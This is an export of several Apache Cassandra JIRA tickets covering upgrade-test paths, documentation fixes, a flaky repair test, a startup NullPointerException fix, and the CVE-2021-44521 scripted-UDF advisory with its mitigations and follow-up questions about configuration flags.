Update SUPPORTED_UPGRADE_PATHS to include 3.0 and 3.x to 4.1 paths and remove obsolete tests,CASSANDRA-17362,13427247,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,maedhroz,maedhroz,maedhroz,08/Feb/22 17:03,27/May/22 19:25,13/Jul/23 08:40,17/Mar/22 22:59,4.1,4.1-alpha1,,,,,Test/dtest/java,,,,0,,"There are two things we might want to clean up around the upgrade test versioning:

1.) Remove or modify tests on trunk for upgrade paths that start before a supported version (ex. 2.2) or end before the current version

2.) Add 3.0  -> 4.1 and 3.x -> 4.1 to the list of supported upgrade paths",,bereng,e.dimitrova,maedhroz,mck,,,,,,,,,,,"maedhroz commented on pull request #1494:
URL: https://github.com/apache/cassandra/pull/1494#issuecomment-1064764124


   https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17362&filter=all


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;11/Mar/22 04:35;githubbot;600","maedhroz commented on pull request #1494:
URL: https://github.com/apache/cassandra/pull/1494#issuecomment-1071745689


   Committed as https://github.com/apache/cassandra/commit/302c6fcf59c5fa9fcd475b2c811ad57ae7c45f49


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;17/Mar/22 22:58;githubbot;600","maedhroz closed pull request #1494:
URL: https://github.com/apache/cassandra/pull/1494


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;17/Mar/22 22:58;githubbot;600","maedhroz commented on pull request #1494:
URL: https://github.com/apache/cassandra/pull/1494#issuecomment-1071749819


   dtest commit: https://github.com/apache/cassandra-dtest/commit/cd6533401282e0455f87ba4d4a58bfec18fde4dc


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;17/Mar/22 23:00;githubbot;600","maedhroz commented on pull request #1494:
URL: https://github.com/apache/cassandra/pull/1494#issuecomment-1071745689






-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;18/Mar/22 14:34;githubbot;600","maedhroz closed pull request #1494:
URL: https://github.com/apache/cassandra/pull/1494


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;18/Mar/22 14:39;githubbot;600",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,3600,,,0,3600,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,maedhroz,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,Code Inspection,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Thu Mar 17 22:59:48 UTC 2022,,,,,,,All,,,,"0|z0zd7c:",9223372036854775807,,,,mck,,,,Normal,,4.1,,https://github.com/apache/cassandra/commit/302c6fcf59c5fa9fcd475b2c811ad57ae7c45f49,,,,,,,,,n/a,,,,,"11/Mar/22 04:36;maedhroz;|trunk|
|[branch|https://github.com/apache/cassandra/pull/1494]|
|[CircleCI|https://app.circleci.com/pipelines/github/maedhroz/cassandra?branch=CASSANDRA-17362&filter=all]|

(Note that in this Circle run, only the unit and in-JVM tests should be relevant.);;;","12/Mar/22 12:53;mck;+1

can we test on ci-cassandra.a.o too please.

and, what about {{cassandra-dtest/upgrade_tests/upgrade_manifest.py}} ?;;;","14/Mar/22 18:39;maedhroz;[~mck] Thanks for the reminder. Here's what I've come up with:

|dtest|
|[branch|https://github.com/apache/cassandra-dtest/pull/177]|
|[Apache CI|https://ci-cassandra.apache.org/view/patches/job/Cassandra-devbranch/1502|]|

(This run uses my dtest branch...);;;","15/Mar/22 16:04;mck;+1 on the python dtest patch too;;;","15/Mar/22 17:18;maedhroz;CircleCI runs are looking good. All failures are already reported issues (like [this one|https://issues.apache.org/jira/browse/CASSANDRA-17164?focusedCommentId=17504438&page=com.atlassian.jira.plugin.system.issuetabpanels:comment-tabpanel#comment-17504438]). Just waiting on Apache CI now...;;;","16/Mar/22 03:44;maedhroz;[~mck] I think the Apache CI run looks ""fine"" as well. The new failures are just new upgrade paths to hit the same problems already present on trunk.

CC [~jmckenzie];;;","17/Mar/22 22:59;maedhroz;dtest commit: https://github.com/apache/cassandra-dtest/commit/cd6533401282e0455f87ba4d4a58bfec18fde4dc;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"DOC - STCS page has LCS in title, broken links in compaction page",CASSANDRA-17361,13427229,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,flightc,mfleming,mfleming,08/Feb/22 15:32,07/Mar/22 06:05,13/Jul/23 08:40,05/Mar/22 00:34,3.11.12,4.0.3,,,,,Documentation/Website,,,,0,,"The STCS page here, [https://cassandra.apache.org/doc/latest/cassandra/operating/compaction/stcs.html], says ""Leveled Compaction Strategy"" in the title where it should say ""Size-tiered Compaction Strategy.

*EDIT:* This needs to be fixed in the following branches:
* {{trunk}} - https://cassandra.apache.org/doc/trunk/cassandra/operating/compaction/stcs.html
* {{4.0}} - https://cassandra.apache.org/doc/4.0/cassandra/operating/compaction/stcs.html
* {{3.11}} - https://cassandra.apache.org/doc/3.11/cassandra/operating/compaction/stcs.html

While looking into this ticket, I've also discovered that the links to the compaction strategy sub-pages are broken in the {{operating/compaction/index.adoc}} and will need to be fixed in the following branches:
* {{trunk}} - https://cassandra.apache.org/doc/trunk/cassandra/operating/compaction/index.html
* {{4.0}} - https://cassandra.apache.org/doc/4.0/cassandra/operating/compaction/index.html
* {{3.11}} - https://cassandra.apache.org/doc/3.11/cassandra/operating/compaction/index.html",,e.dimitrova,erickramirezau,mfleming,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"04/Mar/22 08:52;erickramirezau;c17361-01-STCS_page.png;https://issues.apache.org/jira/secure/attachment/13040710/c17361-01-STCS_page.png",,,,,1.0,erickramirezau,,,,,,,,,,,,,,Documentation,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Mon Mar 07 06:05:50 UTC 2022,,,,,,,All,,,,"0|z0zd40:",9223372036854775807,,,,erickramirezau,mfleming,,,Normal,,3.11.0,,https://github.com/apache/cassandra/commit/ac4cd09cce2886f3e7393cdcd1321152140ec6ec https://github.com/apache/cassandra/commit/0b4d99b6aee8f41ed9542ad078aab086b6d5a021 https://github.com/apache/cassandra/commit/f0ae5364b4e953466e21b9720ff6bea3789097d1,,,,,,,,,Stage doc updates locally and verify that the pages render correctly,,,,,"08/Feb/22 17:32;e.dimitrova;Note to whoever will be working on this ticket:

After the docs migration we have some backlog of the docs upgrades. Before you start, please, check whether there are any additional updates to consider for this page with the community. Thanks in advance;;;","04/Mar/22 08:50;erickramirezau;Patches for affected branches are READY FOR REVIEW:
||Branch||PR||
|{{trunk}}|[#1480|https://github.com/apache/cassandra/pull/1480]|
|{{4.0}}|[#1481|https://github.com/apache/cassandra/pull/1481]|
|{{3.11}}|[#1482|https://github.com/apache/cassandra/pull/1482]|

 !c17361-01-STCS_page.png|width=300! ;;;","05/Mar/22 00:28;erickramirezau;Reviewed by Matt Fleming.;;;","05/Mar/22 00:34;erickramirezau;||Branch||PR||Commit||
|{{trunk}}|[#1480|https://github.com/apache/cassandra/pull/1480]|[ac4cd09|https://github.com/apache/cassandra/commit/ac4cd09cce2886f3e7393cdcd1321152140ec6ec]|
|{{4.0}}|[#1481|https://github.com/apache/cassandra/pull/1481]|[0b4d99b|https://github.com/apache/cassandra/commit/0b4d99b6aee8f41ed9542ad078aab086b6d5a021]|
|{{3.11}}|[#1482|https://github.com/apache/cassandra/pull/1482]|[f0ae536|https://github.com/apache/cassandra/commit/f0ae5364b4e953466e21b9720ff6bea3789097d1]|;;;","07/Mar/22 06:05;erickramirezau;||Branch||PR||Commit||Build||
|{{trunk}}|[#1480|https://github.com/apache/cassandra/pull/1480]|[ac4cd09|https://github.com/apache/cassandra/commit/ac4cd09cce2886f3e7393cdcd1321152140ec6ec]|[#988|https://ci-cassandra.apache.org/job/Cassandra-trunk/988/]|
|{{4.0}}|[#1481|https://github.com/apache/cassandra/pull/1481]|[0b4d99b|https://github.com/apache/cassandra/commit/0b4d99b6aee8f41ed9542ad078aab086b6d5a021]|[#349|https://ci-cassandra.apache.org/job/Cassandra-4.0/349/]|
|{{3.11}}|[#1482|https://github.com/apache/cassandra/pull/1482]|[f0ae536|https://github.com/apache/cassandra/commit/f0ae5364b4e953466e21b9720ff6bea3789097d1]|[#329|https://ci-cassandra.apache.org/job/Cassandra-3.11/329/]|

The changes are now live on the site:
 * https://cassandra.apache.org/doc/latest/cassandra/operating/compaction/index.html
 * https://cassandra.apache.org/doc/latest/cassandra/operating/compaction/stcs.html;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
CVE-2021-44521: Apache Cassandra: Remote code execution for scripted UDFs,CASSANDRA-17352,13426900,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,marcuse,marcuse,marcuse,07/Feb/22 11:45,28/Sep/22 07:07,13/Jul/23 08:40,11/Feb/22 17:36,3.0.26,3.11.12,4.0.2,,,,Feature/UDF,,,,0,,"When running Apache Cassandra with the following configuration:

enable_user_defined_functions: true
enable_scripted_user_defined_functions: true
enable_user_defined_functions_threads: false 

it is possible for an attacker to execute arbitrary code on the host. The attacker would need to have enough permissions to create user defined functions in the cluster to be able to exploit this. Note that this configuration is documented as unsafe, and will continue to be considered unsafe after this CVE.

This issue is being tracked as CASSANDRA-17352

Mitigation:

Set `enable_user_defined_functions_threads: true` (this is default)
or
3.0 users should upgrade to 3.0.26
3.11 users should upgrade to 3.11.12
4.0 users should upgrade to 4.0.2

Credit:

This issue was discovered by Omer Kaspi of the JFrog Security vulnerability research team.",,brandon.williams,jeromatron,jjordan,marcuse,tomasz.lasica,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-17388,CASSANDRA-17394,,,,,,,,,,,,,,,,,,,0.0,marcuse,,,,,,,,,,,,,,Security -> Remote Code Execution,,,,,,,,Normal,User Report,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Sep 28 07:07:09 UTC 2022,,,,,,,All,,,,"0|z0zb3s:",9223372036854775807,,,,,,,,Critical,,,,,,,,,,,,,cci run,,,,,"11/Feb/22 10:14;marcuse;It is possible for an attacker to create a scripted UDF which executes arbitrary code on the server.

Attacker needs to have enough permissions to create user defined functions on the server, and  {{enable_user_defined_functions_threads}} must have been changed from {{true}} to {{false}} by the operator

https://github.com/apache/cassandra/commit/5c9ba06dd31157cd224af2cec75521fefe2c9883

to continue running with {{enable_user_defined_functions_threads: false}} setting {{allow_insecure_udfs: true}} is required

to continue accessing {{System.*}} classes, {{allow_extra_insecure_udfs: true}} is required;;;","17/Feb/22 10:17;tomasz.lasica;There is one thing I do not understand, so please correct me if I get it wrong:
 # default is `public boolean enable_user_defined_functions_threads = true;`
 # ""insecure"" value is `false`
 # so why ""Attacker needs to have enough permissions to (...) and {{enable_user_defined_functions_threads}} must have been changed from {{false}} to {{true}} by the operator

Looking at the patch:

Should all the checks in startup be done if user defined functions are completely disabled?;;;","17/Feb/22 10:21;marcuse;nice catch - I flipped the booleans in the comment above (and edited comment to be correct);;;","17/Feb/22 10:39;tomasz.lasica;Thanks, what about:

> Should all the checks in startup be done if user defined functions are completely disabled?;;;","17/Feb/22 11:40;marcuse;not sure I understand the question - is there a problem with the patch?;;;","17/Feb/22 12:09;tomasz.lasica;If I understand correctly to exploit following conditions are required:

(after [https://jfrog.com/blog/cve-2021-44521-exploiting-apache-cassandra-user-defined-functions-for-remote-code-execution/] )

Cassandra deployments are vulnerable to CVE-2021-44521 when the *cassandra.yaml* configuration file contains the following definitions:

{code}
enable_user_defined_functions: true
enable_scripted_user_defined_functions: true
enable_user_defined_functions_threads: false
{code}

And I wonder what will be the behavior of the patch with following settings:

{code}
enable_user_defined_functions: true
enable_scripted_user_defined_functions: false
enable_user_defined_functions_threads: false
allow_insecure_udfs: false (default after upgrade)
{code}

In this case there is no vulnerability yet I think ConfigurationException will be fired?
Is this expected behavior?
;;;","17/Feb/22 12:12;tomasz.lasica;> not sure I understand the question - is there a problem with the patch?

That is what I am trying to find out. But mostly I am trying to get full understanding about expected behavior.;;;","17/Feb/22 12:16;marcuse;yes, https://github.com/apache/cassandra/blob/cassandra-3.0/src/java/org/apache/cassandra/config/Config.java#L329-L340 - there are most likely other issues when running with {{enable_user_defined_functions_threads: false}};;;","17/Feb/22 12:27;tomasz.lasica;Thanks a lot for all the explanation.;;;","18/Feb/22 01:27;jjordan;Is there a unit test that can be pushed now that this is public?;;;","08/Sep/22 20:10;jeromatron;I just want to make sure the settings have the practical outcomes that are intended.

I can use UDFs with just the following setting:

{{enable_user_defined_functions: true}}

However if I want to enable multi-threaded behavior in the UDFs, I would need to set:

{{enable_user_defined_functions: true}}
{{enable_user_defined_functions_threads: false}}
{{allow_insecure_udfs: true}}

If I don't do the last one, {{allow_insecure_udfs: true}}, then the server doesn't start and it gives the warning/recommendation but also says that it would require that field to be set to true to continue.

Once these fields are set, I can start the server (in my case 3.11.13).  However according to the [code|https://github.com/apache/cassandra/blob/cassandra-3.11/src/java/org/apache/cassandra/security/ThreadAwareSecurityManager.java#L186], it looks like the {{allow_extra_insecure_udfs}} setting should also be set to true for the server to start up.  Otherwise it should throw an AccessDenied exception.

So my question is: is there a bug in the implementation where we allow it to start without setting {{allow_extra_insecure_udfs: true}}?  Also if it does throw an AccessDenied exception, shouldn't it fail earlier when parsing the configuration with a log message that it is required?

That leads to another question about this, if it does require both flags to start the server, why do we have two flags?  Why not just {{allow_insecure_udfs}} if there is no effective difference between setting {{allow_insecure_udfs}} and setting both of them.  I know the intent from the ticket was that the {{allow_extra_insecure_udfs}} was to further relax security for those wanting to use the java.lang.System package in the UDF, but the line of code from the ThreadAwareSecurityManager seems to suggest that there is no difference.;;;","27/Sep/22 19:32;jeromatron;[~marcuse] do you have any thoughts on the flags that were used here?  Am I misunderstanding intent of having two flags?;;;","28/Sep/22 07:07;marcuse;The difference between the flags is;

bq. to continue running with enable_user_defined_functions_threads: false setting allow_insecure_udfs: true is required
bq. to continue accessing System.* classes, allow_extra_insecure_udfs: true is required;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Fix flaky test - dtest-novnode.repair_tests.repair_test.TestRepair.test_simple_sequential_repair,CASSANDRA-17349,13426678,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,brandon.williams,brandon.williams,brandon.williams,04/Feb/22 17:49,08/Feb/23 18:11,13/Jul/23 08:40,08/Feb/23 18:11,3.0.27,,,,,,Consistency/Repair,,,,0,,"Failed 2 times in the last 9 runs. Flakiness: 37%, Stability: 77%
Error Message

cassandra.DriverException: ID mismatch while trying to reprepare (expected b'ba2c66a4f13080265ea718e037637d4a', got b'52faf62235132756a26828817a81168d'). This prepared statement won't work anymore. This usually happens when you run a 'USE...' query after the statement was prepared.

Stacktrace

self = <repair_tests.repair_test.TestRepair object at 0x7ff6850f5a60>

    def test_simple_sequential_repair(self):
        """"""
            Calls simple repair test with a sequential repair
            """"""
>       self._simple_repair(sequential=True)

repair_tests/repair_test.py:363: ",,bereng,xgerman42,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,CASSANDRA-15252,,,,,,,,,,,,,,,,0.0,brandon.williams,,,,,,,,,,,,,,Correctness -> Test Failure,,,,,,,,Normal,DTest,,false,,,,,,,,,,,,,,,,,9223372036854775807,,None,,Wed Feb 08 18:11:08 UTC 2023,,,,,,,All,,,,"0|z0z9qg:",9223372036854775807,,,,bereng,,,,Normal,,NA,,https://github.com/apache/cassandra-dtest/commit/ad99d5c3cc24261a970cb58a8002942f8fcd9700,,,,,,,,,Run CI,,,,,"04/Feb/22 17:51;brandon.williams;I suspect fixing (perhaps just via backporting) one of the many USE issues with prepared statements in 3.0 will solve this and a few other tickets.;;;","11/Feb/22 14:02;brandon.williams;This is broken by CASSANDRA-15252.

[Repeatedly passing|https://app.circleci.com/pipelines/github/driftx/cassandra/355/workflows/8f4228a9-f769-4d64-9248-315d9cf16dba/jobs/4047] before the commit.

[Failing|https://app.circleci.com/pipelines/github/driftx/cassandra/356/workflows/11ef3ae6-d59a-4d98-8a50-a23659118b7b/jobs/4048] afterward.;;;","05/Apr/22 15:41;brandon.williams;Looks like this fell off butler, but we know from CASSANDRA-17140 that this is caused by the USE statement, so I removed it [here|https://github.com/driftx/cassandra-dtest/tree/CASSANDRA-17349], and [here's a repeated run|https://app.circleci.com/pipelines/github/driftx/cassandra/428/workflows/e0369658-6263-4321-ba8b-bc432c5b9460/jobs/5009].;;;","06/Apr/22 04:56;bereng;+1;;;","06/Apr/22 11:39;brandon.williams;Committed, thanks.;;;","08/Feb/23 18:06;xgerman42;h1. 2/8/23 - seen once
h1.  
h1. Regression

dtest-offheap.repair_tests.repair_test.TestRepair.test_simple_sequential_repair (from Cassandra dtests)
Failing for the past 1 build (Since [#540|https://ci-cassandra.apache.org/job/Cassandra-4.0/540/] )
[Took 3 min 45 sec.|https://ci-cassandra.apache.org/job/Cassandra-4.0/540/testReport/dtest-offheap.repair_tests.repair_test/TestRepair/test_simple_sequential_repair/history]
 
!https://ci-cassandra.apache.org/static/f3f9be2d/images/32x32/health-80plus.png! Failed 1 times in the last 30 runs. Flakiness: 3%, Stability: 96%
h3. Error Message

failed on teardown with ""Unexpected error found in node logs (see stdout for full details). Errors: [[node2] 'ERROR [MemtableReclaimMemory:2] 2023-02-08 06:05:59,669 CassandraDaemon.java:581 - Exception in thread Thread[MemtableReclaimMemory:2,5,main]\njava.lang.AssertionError: null\n\tat org.apache.cassandra.utils.memory.MemtablePool$SubPool.released(MemtablePool.java:193)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.releaseAll(MemtableAllocator.java:151)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.setDiscarded(MemtableAllocator.java:142)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator.setDiscarded(MemtableAllocator.java:93)\n\tat org.apache.cassandra.utils.memory.NativeAllocator.setDiscarded(NativeAllocator.java:203)\n\tat org.apache.cassandra.db.Memtable.setDiscarded(Memtable.java:212)\n\tat org.apache.cassandra.db.ColumnFamilyStore$Flush$1.runMayThrow(ColumnFamilyStore.java:1216)\n\tat org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:28)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.lang.Thread.run(Thread.java:750)']""
h3. Stacktrace

Unexpected error found in node logs (see stdout for full details). Errors: [[node2] 'ERROR [MemtableReclaimMemory:2] 2023-02-08 06:05:59,669 CassandraDaemon.java:581 - Exception in thread Thread[MemtableReclaimMemory:2,5,main]\njava.lang.AssertionError: null\n\tat org.apache.cassandra.utils.memory.MemtablePool$SubPool.released(MemtablePool.java:193)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.releaseAll(MemtableAllocator.java:151)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator$SubAllocator.setDiscarded(MemtableAllocator.java:142)\n\tat org.apache.cassandra.utils.memory.MemtableAllocator.setDiscarded(MemtableAllocator.java:93)\n\tat org.apache.cassandra.utils.memory.NativeAllocator.setDiscarded(NativeAllocator.java:203)\n\tat org.apache.cassandra.db.Memtable.setDiscarded(Memtable.java:212)\n\tat org.apache.cassandra.db.ColumnFamilyStore$Flush$1.runMayThrow(ColumnFamilyStore.java:1216)\n\tat org.apache.cassandra.utils.WrappedRunnable.run(WrappedRunnable.java:28)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat io.netty.util.concurrent.FastThreadLocalRunnable.run(FastThreadLocalRunnable.java:30)\n\tat java.lang.Thread.run(Thread.java:750)'];;;","08/Feb/23 18:11;brandon.williams;A new ticket should be opened for that failure.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Instance failed to start up due to NPE in StartupClusterConnectivityChecker,CASSANDRA-17347,13426533,Bug,Resolved,CASSANDRA,Cassandra,software,mck,"<p>The Cassandra Project is a distributed storage system for managing structured/unstructured data while providing reliability at a massive scale.</p>
<br/>
<p>Please request the <b>creation of a jira account</b> on either the <a href=""https://cassandra.apache.org/_/community.html#discussions"">dev@cassandra.apache.org</a> mailing list or the ASF slack channel <a href=""https://cassandra.apache.org/_/community.html#discussions"">#cassandra-dev</a></p>",http://cassandra.apache.org/,Normal,Fixed,frankgh,frankgh,frankgh,04/Feb/22 00:58,07/Mar/23 11:52,13/Jul/23 08:40,09/Feb/22 18:25,4.1,4.1-alpha1,,,,,Observability/Logging,,,,0,,"Instance is crashing during startup due to a NPE in StartupClusterConnectivityChecker with stack trace:
{noformat}
java.lang.NullPointerException: element cannot be mapped to a null key
        at java.util.Objects.requireNonNull(Objects.java:228)
        at java.util.stream.Collectors.lambda$groupingBy$45(Collectors.java:907)
        at java.util.stream.ReduceOps$3ReducingSink.accept(ReduceOps.java:169)
        at java.util.ArrayList$ArrayListSpliterator.forEachRemaining(ArrayList.java:1382)
        at java.util.stream.AbstractPipeline.copyInto(AbstractPipeline.java:482)
        at java.util.stream.AbstractPipeline.wrapAndCopyInto(AbstractPipeline.java:472)
        at java.util.stream.ReduceOps$ReduceOp.evaluateSequential(ReduceOps.java:708)
        at java.util.stream.AbstractPipeline.evaluate(AbstractPipeline.java:234)
        at java.util.stream.ReferencePipeline.collect(ReferencePipeline.java:566)
        at org.apache.cassandra.net.StartupClusterConnectivityChecker.execute(StartupClusterConnectivityChecker.java:173)
{noformat}",,frankgh,smiklosovic,yifanc,,,,,,,,,,,,"yifan-c commented on a change in pull request #1438:
URL: https://github.com/apache/cassandra/pull/1438#discussion_r799729740



##########
File path: src/java/org/apache/cassandra/net/StartupClusterConnectivityChecker.java
##########
@@ -171,7 +172,10 @@ public boolean execute(Set<InetAddressAndPort> peers, Function<InetAddressAndPor
         {
             // dc -> missing peer host addresses
             Map<String, List<String>> peersDown = acks.getMissingPeers().stream()
-                                                      .collect(groupingBy(peerToDatacenter::get,
+                                                      .collect(groupingBy(peer -> {
+                                                                              String dc = peerToDatacenter.get(peer);
+                                                                              return dc != null ? dc : StringUtils.defaultString(getDatacenterSource.apply(peer), ""unknown"");

Review comment:
       The goal is here very simple, i.e. try to resolve the value from the map cache, if not try to resolve from snitch, if all attempts fail, use the default ""unknown"". 
   There are so many ways to express it in the code and all correctly. Functional, ternary operator, or just the plain `if`
   In this particular scenario, I would rate the plain `if` to have the best readability, then the ternary operator. Functional seems a bit overkill. 




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;04/Feb/22 18:52;githubbot;600","frankgh commented on a change in pull request #1438:
URL: https://github.com/apache/cassandra/pull/1438#discussion_r799738846



##########
File path: src/java/org/apache/cassandra/net/StartupClusterConnectivityChecker.java
##########
@@ -171,7 +172,10 @@ public boolean execute(Set<InetAddressAndPort> peers, Function<InetAddressAndPor
         {
             // dc -> missing peer host addresses
             Map<String, List<String>> peersDown = acks.getMissingPeers().stream()
-                                                      .collect(groupingBy(peerToDatacenter::get,
+                                                      .collect(groupingBy(peer -> {
+                                                                              String dc = peerToDatacenter.get(peer);
+                                                                              return dc != null ? dc : StringUtils.defaultString(getDatacenterSource.apply(peer), ""unknown"");

Review comment:
       I agree that plain `if` is more readable. I'm going with that approach




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;04/Feb/22 19:05;githubbot;600","frankgh commented on a change in pull request #1438:
URL: https://github.com/apache/cassandra/pull/1438#discussion_r800927741



##########
File path: src/java/org/apache/cassandra/net/StartupClusterConnectivityChecker.java
##########
@@ -170,12 +171,10 @@ public boolean execute(Set<InetAddressAndPort> peers, Function<InetAddressAndPor
         }
         else
         {
+
             // dc -> missing peer host addresses
             Map<String, List<String>> peersDown = acks.getMissingPeers().stream()
-                                                      .collect(groupingBy(peer -> {
-                                                                              String dc = peerToDatacenter.get(peer);
-                                                                              return dc != null ? dc : StringUtils.defaultString(getDatacenterSource.apply(peer), ""unknown"");
-                                                                          },
+                                                      .collect(groupingBy(peer -> Optional.ofNullable(peerToDatacenter.get(peer)).orElseGet(() -> StringUtils.defaultString(getDatacenterSource.apply(peer), ""unknown"")),

Review comment:
       @smiklosovic I have pushed one update that favors readability. I think we can go with this version of the code :) 




-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
;07/Feb/22 18:11;githubbot;600","smiklosovic closed pull request #1438:
URL: https://github.com/apache/cassandra/pull/1438


   


-- 
This is an automated message from the Apache Git Service.
To respond to the message, please log on to GitHub and use the
URL above to go to the specific comment.

To unsubscribe, e-mail: pr-unsubscribe@cassandra.apache.org

For queries about this service, please contact Infrastructure at:
users@infra.apache.org
